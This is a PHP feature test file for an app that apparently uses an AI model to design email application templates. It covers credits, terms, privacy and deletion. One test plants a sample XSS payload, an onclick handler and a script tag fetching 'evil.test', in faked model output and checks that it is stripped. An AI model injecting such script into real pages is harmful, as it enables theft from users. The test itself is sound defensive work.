<?php

namespace Tests\Feature\Templates;

use App\Models\AiGeneration;
use App\Models\CreditTransaction;
use App\Models\EmailTemplate;
use App\Models\Profile;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Testing\TestResponse;
use Tests\TestCase;

class GenerateTemplateTest extends TestCase
{
    use RefreshDatabase;

    private const BRIEF = 'A bold colourful layout for a graphic designer applying to a creative studio, with a short pitch and a list of tools.';

    protected function setUp(): void
    {
        parent::setUp();

        config()->set('services.deepseek.key', 'test-key');
        config()->set('emailcv.credits.prices.template_design', 30);
        config()->set('emailcv.credits.monthly_grant', 300);
    }

    private function user(): User
    {
        $user = User::factory()->create();
        Profile::factory()->for($user)->create();

        RateLimiter::clear('generate-template:'.$user->id);

        return $user;
    }

    private function validHtml(): string
    {
        return '<table role="presentation" width="100%"><tr>'
            .'<td style="background-color:{{ accent }}; color:{{ accent_contrast }}">'
            .'<h1>{{ full_name }}</h1></td></tr><tr>'
            .'<td style="background-color:#ffffff"><p>Dear {{ recipient_name }},</p>'
            .'<p>{{ intro_paragraph }}</p>'
            .'<p>Applying for {{ position }} at {{ company }}.</p>'
            .'<p>{{ body_paragraph }}</p>'
            .'<div>{{# tools }}<span>{{ . }}</span>{{/ tools }}</div>'
            .'<p>{{ closing_paragraph }}</p></td></tr></table>';
    }

    private function fakeModel(?string $html = null): void
    {
        Http::fake([
            '*/chat/completions' => Http::response([
                'choices' => [[
                    'message' => [
                        'content' => json_encode([
                            'name' => 'Bold Studio',
                            'description' => 'A loud layout for creative applications.',
                            'accent_color' => '#FF5A5F',
                            'html' => $html ?? $this->validHtml(),
                        ]),
                    ],
                ]],
                'usage' => ['prompt_tokens' => 1200, 'completion_tokens' => 800, 'total_tokens' => 2000],
            ]),
        ]);
    }

    private function generate(User $user): TestResponse
    {
        return $this->actingAs($user)->post(route('templates.generate.store'), [
            'brief' => self::BRIEF,
            'accept_terms' => true,
        ]);
    }

    public function test_a_user_can_have_a_template_designed(): void
    {
        $this->fakeModel();
        $user = $this->user();

        $this->generate($user)->assertRedirect();

        $template = EmailTemplate::madeByUsers()->sole();

        $this->assertSame('Bold Studio', $template->name);
        $this->assertSame($user->id, $template->created_by);
        $this->assertSame('user', $template->origin);
        $this->assertSame('private', $template->visibility);
        $this->assertNotNull($template->terms_accepted_at);
        $this->assertSame(self::BRIEF, $template->brief);
        $this->assertNotEmpty($template->fields);
    }

    public function test_the_generation_is_logged_against_the_template(): void
    {
        $this->fakeModel();

        $this->generate($this->user());

        $generation = AiGeneration::where('kind', 'template')->sole();

        $this->assertSame('success', $generation->status);
        $this->assertSame(EmailTemplate::madeByUsers()->sole()->id, $generation->email_template_id);
        $this->assertSame(2000, $generation->total_tokens);
    }

    public function test_the_terms_must_be_accepted(): void
    {
        Http::fake();

        $this->actingAs($this->user())
            ->post(route('templates.generate.store'), ['brief' => self::BRIEF, 'accept_terms' => false])
            ->assertSessionHasErrors('accept_terms');

        Http::assertNothingSent();
        $this->assertDatabaseCount('email_templates', 0);
    }

    public function test_the_brief_must_say_something(): void
    {
        Http::fake();

        $this->actingAs($this->user())
            ->post(route('templates.generate.store'), ['brief' => 'nice one', 'accept_terms' => true])
            ->assertSessionHasErrors('brief');

        Http::assertNothingSent();
    }

    public function test_a_design_costs_credits(): void
    {
        $this->fakeModel();
        $user = $this->user();

        $before = $user->creditBalance();

        $this->generate($user)->assertRedirect();

        $this->assertSame($before - 30, $user->fresh()->creditBalance());

        $spend = CreditTransaction::where('reason', CreditTransaction::TEMPLATE_DESIGN)->sole();

        $this->assertSame(-30, $spend->amount);
        $this->assertSame(EmailTemplate::madeByUsers()->sole()->id, $spend->email_template_id);
    }

    public function test_it_stops_when_the_balance_will_not_cover_a_design(): void
    {
        $this->fakeModel();
        $user = $this->user();

        $user->creditTransactions()->create([
            'amount' => -($user->creditBalance() - 20),
            'reason' => CreditTransaction::ADMIN_ADJUSTMENT,
        ]);

        $this->assertSame(20, $user->fresh()->creditBalance());

        $this->generate($user)->assertSessionHasErrors('brief');

        Http::assertNothingSent();
    }

    public function test_a_design_costs_three_times_a_draft(): void
    {
        $this->assertSame(
            3 * (int) config('emailcv.credits.prices.application_draft'),
            (int) config('emailcv.credits.prices.template_design'),
            'The prices are set from measured API cost; changing one without the other loses money.'
        );
    }

    public function test_a_rejected_design_does_not_cost_an_allowance(): void
    {
        // No greeting and no role tokens, on both the first attempt and the repair.
        $this->fakeModel('<table><tr><td>{{ full_name }} {{ intro_paragraph }} {{ body_paragraph }} {{ closing_paragraph }}</td></tr></table>');
        $user = $this->user();

        $this->generate($user)->assertSessionHasErrors('brief');

        $this->assertDatabaseCount('email_templates', 0);
        $this->assertSame('failed', AiGeneration::sole()->status);
        $this->assertSame(300, $user->fresh()->creditBalance(), 'A rejected design must be free.');
        $this->assertDatabaseMissing('credit_transactions', ['reason' => CreditTransaction::TEMPLATE_DESIGN]);
    }

    public function test_malicious_markup_from_the_model_is_stripped_before_it_is_stored(): void
    {
        $this->fakeModel(str_replace(
            '<h1>{{ full_name }}</h1>',
            '<h1 onclick="steal()">{{ full_name }}</h1><script>fetch("https://evil.test")</script>',
            $this->validHtml()
        ));

        $this->generate($this->user())->assertRedirect();

        $html = EmailTemplate::madeByUsers()->sole()->html;

        $this->assertStringNotContainsString('<script', $html);
        $this->assertStringNotContainsString('onclick', $html);
        $this->assertStringContainsString('{{ full_name }}', $html);
    }

    public function test_a_generated_template_is_private_to_its_author(): void
    {
        $this->fakeModel();
        $author = $this->user();
        $stranger = $this->user();

        $this->generate($author);
        $id = EmailTemplate::madeByUsers()->sole()->id;

        $this->actingAs($author)->get(route('templates.index'))
            ->assertInertia(fn ($page) => $page->where(
                'templates',
                fn ($templates) => collect($templates)->contains('id', $id)
            ));

        $this->actingAs($stranger)->get(route('templates.index'))
            ->assertInertia(fn ($page) => $page->where(
                'templates',
                fn ($templates) => ! collect($templates)->contains('id', $id)
            ));
    }

    public function test_a_stranger_cannot_start_an_application_from_a_private_template(): void
    {
        $this->fakeModel();
        $author = $this->user();
        $stranger = $this->user();

        $this->generate($author);

        $this->actingAs($stranger)
            ->post(route('applications.store'), ['email_template_id' => EmailTemplate::madeByUsers()->sole()->id])
            ->assertNotFound();
    }

    public function test_an_author_can_delete_their_own_template(): void
    {
        $this->fakeModel();
        $author = $this->user();

        $this->generate($author);

        $this->actingAs($author)
            ->delete(route('templates.destroy', EmailTemplate::madeByUsers()->sole()))
            ->assertRedirect(route('templates.index'));

        $this->assertDatabaseCount('email_templates', 0);
    }

    public function test_a_stranger_cannot_delete_someone_elses_template(): void
    {
        $this->fakeModel();
        $author = $this->user();
        $stranger = $this->user();

        $this->generate($author);

        $this->actingAs($stranger)
            ->delete(route('templates.destroy', EmailTemplate::madeByUsers()->sole()))
            ->assertForbidden();

        $this->assertDatabaseCount('email_templates', 1);
    }
}
